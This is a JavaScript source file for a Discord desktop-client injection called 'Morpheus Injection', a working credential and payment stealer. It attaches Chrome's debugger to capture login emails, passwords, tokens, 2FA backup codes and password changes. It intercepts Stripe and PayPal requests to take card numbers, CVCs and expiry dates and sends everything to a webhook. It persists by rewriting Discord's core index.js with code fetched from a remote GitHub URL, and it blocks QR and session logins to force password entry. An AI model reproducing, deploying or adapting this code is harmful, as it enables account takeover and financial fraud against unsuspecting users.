const fs = require("fs");
const os = require("os");
const https = require("https");
const args = process.argv;
const path = require("path");
const querystring = require("querystring");

const { BrowserWindow, session, app } = require("electron");

const CONFIG = {
  webhook:
    "%WEBHOOK%",
  injection_url:
    "https://raw.githubusercontent.com/Nyxoy201/Morpheus-Injection/main/index.js",
  filters: {
    urls: [
      "/auth/login",
      "/auth/register",
      "/mfa/totp",
      "/mfa/codes-verification",
      "/users/@me",
    ],
  },
  filters2: {
    urls: [
      "wss://remote-auth-gateway.discord.gg/*",
      "https://discord.com/api/v*/auth/sessions",
      "https://*.discord.com/api/v*/auth/sessions",
      "https://discordapp.com/api/v*/auth/sessions",
    ],
  },
  payment_filters: {
    urls: [
      "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
      "https://api.stripe.com/v*/tokens",
    ],
  },
  API: "https://discord.com/api/v9/users/@me",
};

const executeJS = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const clearAllUserData = () => {
  const window = BrowserWindow.getAllWindows()[0];
  window.webContents.session.flushStorageData();
  window.webContents.session.clearStorageData();
  app.relaunch();
  app.exit();
};

const getToken = async () =>
  await executeJS(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
  );

const request = async (method, url, headers, data) => {
  url = new URL(url);
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: method,
    headers: {
      "Access-Control-Allow-Origin": "*",
    },
  };

  if (url.search) options.path += url.search;
  for (const key in headers) options.headers[key] = headers[key];
  const req = https.request(options);
  if (data) req.write(data);
  req.end();

  return new Promise((resolve, reject) => {
    req.on("response", (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => resolve(data));
    });
  });
};

const hooker = async (content, token, account) => {
  content["username"] = "Morpheus Injection";
  content["avatar_url"] = "http://31.207.34.138/img/pfp.jpg";

  content["embeds"][0]["thumbnail"] = {
    url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`,
  };
  content["embeds"][0]["footer"] = {
    text: "Morpheus | t.me/morpheusgroup",
    icon_url: "http://31.207.34.138/img/pfp.jpg",
  };
  content["embeds"][0]["title"] = content["name"];

  const billing = await getBilling(token);
  const email = account.email;

  content["embeds"][0]["fields"].push(
    {
      name: "<a:crown:1240635323671773258> Token",
      value: "```" + token + "```",
      inline: false,
    },
    {
      name: "<a:drag:1240636089258086461> Email",
      value: `\`${email}\``,
      inline: true,
    },
    {
      name: "<:billing:1240636353364889700> Billing",
      value: billing,
      inline: true,
    }
  );

  for (const embed in content["embeds"]) {
    content["embeds"][embed]["color"] = 0x000;
  }

  await request(
    "POST",
    CONFIG.webhook,
    {
      "Content-Type": "application/json",
    },
    JSON.stringify(content)
  );
};

const fetch = async (endpoint, headers) => {
  return JSON.parse(await request("GET", CONFIG.API + endpoint, headers));
};

const fetchAccount = async (token) =>
  await fetch("", {
    Authorization: token,
  });
const fetchBilling = async (token) =>
  await fetch("/billing/payment-sources", {
    Authorization: token,
  });

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  let billing = "";
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += "<:card:1240685133128798258> ";
          break;
        case 2:
          billing += "<:paypal:1240684761639551077> ";
          break;
      }
    }
  });
  return billing || "`None`";
};

const EmailPassToken = async (email, password, token, action) => {
  const account = await fetchAccount(token);

  const content = {
    name: `${account.username} just ${action}!`,
    embeds: [
      {
        fields: [
          {
            name: "<a:drag:1240636089258086461> Email",
            value: "`" + email + "`",
            inline: true,
          },
          {
            name: "<:password:1240676883583078441> Password",
            value: "`" + password + "`",
            inline: true,
          },
        ],
      },
    ],
  };

  hooker(content, token, account);
};

const BackupCodesViewed = async (codes, token) => {
  const account = await fetchAccount(token);

  const filteredCodes = codes.filter((code) => {
    return code.consumed === false;
  });

  let message = "";
  for (let code of filteredCodes) {
    message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
  }
  const content = {
    name: `Backups Codes for ${account.username}`,
    embeds: [
      {
        fields: [
          {
            name: "<a:drag:1240636089258086461> Backup Codes",
            value: "```" + message + "```",
            inline: false,
          },
          {
            name: "<:blackstar:1240640910392430602> Email",
            value: "`" + account.email + "`",
            inline: true,
          },
          {
            name: "<:start:1240635319418884138> Phone",
            value: "`" + (account.phone || "None") + "`",
            inline: true,
          },
        ],
      },
    ],
  };

  hooker(content, token, account);
};

const PasswordChanged = async (newPassword, oldPassword, token) => {
  const account = await fetchAccount(token);

  const content = {
    name: `Password Changed for ${account.username}`,
    embeds: [
      {
        fields: [
          {
            name: "<:password:1240676883583078441> New Password",
            value: "`" + newPassword + "`",
            inline: true,
          },
          {
            name: "<:password:1240676883583078441> Old Password",
            value: "`" + oldPassword + "`",
            inline: true,
          },
        ],
      },
    ],
  };

  hooker(content, token, account);
};

const CreditCardAdded = async (number, cvc, month, year, token) => {
  const account = await fetchAccount(token);

  const content = {
    name: `Credit Card Added for ${account.username}`,
    embeds: [
      {
        fields: [
          {
            name: "<:card:1240685133128798258> Number",
            value: "`" + number + "`",
            inline: false,
          },
          {
            name: "<:blackstar:1240640910392430602> CVC",
            value: "`" + cvc + "`",
            inline: true,
          },
          {
            name: "<a:dead:1240647144013168681> Expiration",
            value: "`" + month + "/" + year + "`",
            inline: true,
          },
        ],
      },
    ],
  };

  hooker(content, token, account);
};

const PaypalAdded = async (token) => {
  const account = await fetchAccount(token);

  const content = {
    name: `Paypal Added for ${account.username}`,
    embeds: [
      {
        fields: [
          {
            name: "<:paypal:1240684761639551077> Email",
            value: "`" + account.email + "`",
            inline: true,
          },
          {
            name: "<:blackstar:1240640910392430602> Phone",
            value: "`" + (account.phone || "None") + "`",
            inline: true,
          },
        ],
      },
    ],
  };

  hooker(content, token, account);
};

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === "win32") {
    resourcePath = path.join(app, "resources");
  } else if (process.platform === "darwin") {
    resourcePath = path.join(app, "Contents", "Resources");
  }

  if (fs.existsSync(resourcePath))
    return {
      resourcePath,
      app,
    };
  return {
    undefined,
    undefined,
  };
})();

async function initiation() {
  if (fs.existsSync(path.join(__dirname, "initiation"))) {
    fs.rmdirSync(path.join(__dirname, "initiation"));

    const token = await getToken();
    if (!token) return;

    const account = await fetchAccount(token);

    const content = {
      name: `Injected ${account.username}`,

      embeds: [
        {
          fields: [
            {
              name: "<a:drag:1240636089258086461> Email",
              value: "`" + account.email + "`",
              inline: true,
            },
            {
              name: "<:blackstar:1240640910392430602> Phone",
              value: "`" + (account.phone || "None") + "`",
              inline: true,
            },
          ],
        },
      ],
    };

    await hooker(content, token, account);
    clearAllUserData();
  }

  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, "app");
  const packageJson = path.join(appPath, "package.json");
  const resourceIndex = path.join(appPath, "index.js");
  const coreVal = fs
    .readdirSync(`${app}\\modules\\`)
    .filter((x) => /discord_desktop_core-+?/.test(x))[0];
  const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
  const bdPath = path.join(
    process.env.APPDATA,
    "\\betterdiscord\\data\\betterdiscord.asar"
  );
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === "win32" || process.platform === "darwin") {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: "discord",
          main: "index.js",
        },
        null,
        4
      )
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
  const indexJs = '${indexJs}';
  const bdPath = '${bdPath}';
  const fileSize = fs.statSync(indexJs).size
  fs.readFileSync(indexJs, 'utf8', (err, data) => {
      if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
          init();
  })
  async function init() {
      https.get('${CONFIG.injection_url}', (res) => {
          const file = fs.createWriteStream(indexJs);
          res.replace('%WEBHOOK%', '${CONFIG.webhook}')
          res.pipe(file);
          file.on('finish', () => {
              file.close();
          });
      
      }).on("error", (err) => {
          setTimeout(init(), 10000);
      });
  }
  require('${path.join(resourcePath, "app.asar")}')
  if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
  }
}

let email = "";
let password = "";
let initiationCalled = false;
const createWindow = () => {
  mainWindow = BrowserWindow.getAllWindows()[0];
  if (!mainWindow) return;

  mainWindow.webContents.debugger.attach("1.3");
  mainWindow.webContents.debugger.on("message", async (_, method, params) => {
    if (!initiationCalled) {
      await initiation();
      initiationCalled = true;
    }

    if (method !== "Network.responseReceived") return;
    if (!CONFIG.filters.urls.some((url) => params.response.url.endsWith(url)))
      return;
    if (![200, 202].includes(params.response.status)) return;

    const responseUnparsedData =
      await mainWindow.webContents.debugger.sendCommand(
        "Network.getResponseBody",
        {
          requestId: params.requestId,
        }
      );
    const responseData = JSON.parse(responseUnparsedData.body);

    const requestUnparsedData =
      await mainWindow.webContents.debugger.sendCommand(
        "Network.getRequestPostData",
        {
          requestId: params.requestId,
        }
      );
    const requestData = JSON.parse(requestUnparsedData.postData);

    switch (true) {
      case params.response.url.endsWith("/login"):
        if (!responseData.token) {
          email = requestData.login;
          password = requestData.password;
          return; // 2FA
        }
        EmailPassToken(
          requestData.login,
          requestData.password,
          responseData.token,
          "logged in"
        );
        break;

      case params.response.url.endsWith("/register"):
        EmailPassToken(
          requestData.email,
          requestData.password,
          responseData.token,
          "signed up"
        );
        break;

      case params.response.url.endsWith("/totp"):
        EmailPassToken(
          email,
          password,
          responseData.token,
          "logged in with 2FA"
        );
        break;

      case params.response.url.endsWith("/codes-verification"):
        BackupCodesViewed(responseData.backup_codes, await getToken());
        break;

      case params.response.url.endsWith("/@me"):
        if (!requestData.password) return;

        if (requestData.email) {
          EmailPassToken(
            requestData.email,
            requestData.password,
            responseData.token,
            "changed his email to **" + requestData.email + "**"
          );
        }

        if (requestData.new_password) {
          PasswordChanged(
            requestData.new_password,
            requestData.password,
            responseData.token
          );
        }
        break;
    }
  });

  mainWindow.webContents.debugger.sendCommand("Network.enable");

  mainWindow.on("closed", () => {
    createWindow();
  });
};
createWindow();

session.defaultSession.webRequest.onCompleted(
  CONFIG.payment_filters,
  async (details, _) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method != "POST") return;
    switch (true) {
      case details.url.endsWith("tokens"):
        const item = querystring.parse(
          Buffer.from(details.uploadData[0].bytes).toString()
        );
        CreditCardAdded(
          item["card[number]"],
          item["card[cvc]"],
          item["card[exp_month]"],
          item["card[exp_year]"],
          await getToken()
        );
        break;

      case details.url.endsWith("paypal_accounts"):
        PaypalAdded(await getToken());
        break;
    }
  }
);

session.defaultSession.webRequest.onBeforeRequest(
  CONFIG.filters2,
  (details, callback) => {
    if (
      details.url.startsWith("wss://remote-auth-gateway") ||
      details.url.endsWith("auth/sessions")
    )
      return callback({
        cancel: true,
      });
  }
);

module.exports = require("./core.asar");
